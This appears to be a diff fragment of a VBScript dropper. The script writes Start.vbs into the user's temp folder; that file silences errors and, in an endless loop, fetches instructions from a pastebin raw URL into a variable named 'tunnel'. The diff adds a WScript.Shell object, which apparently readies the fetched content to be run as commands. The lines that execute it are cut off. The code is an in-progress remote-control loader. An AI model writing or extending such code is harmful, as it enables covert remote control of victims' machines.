@@ -12,8 +12,9 @@ End If
 tempPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%temp%") & "\Start.vbs"
 Set objFile = objFSO.CreateTextFile(tempPath, True)
 objFile.WriteLine "On Error Resume Next"
-objFile.WriteLine "Do While True"
 objFile.WriteLine "Set oHTTP = CreateObject(""MSXML2.XMLHTTP"")"
+objFile.WriteLine "Set objShell = CreateObject(""WScript.Shell"")"
+objFile.WriteLine "Do While True"
 objFile.WriteLine "oHTTP.open ""GET"", ""https://pastebin.com/raw/knWXwasC"", False"
 objFile.WriteLine "oHTTP.send"
 objFile.WriteLine "tunnel = oHTTP.responseText"
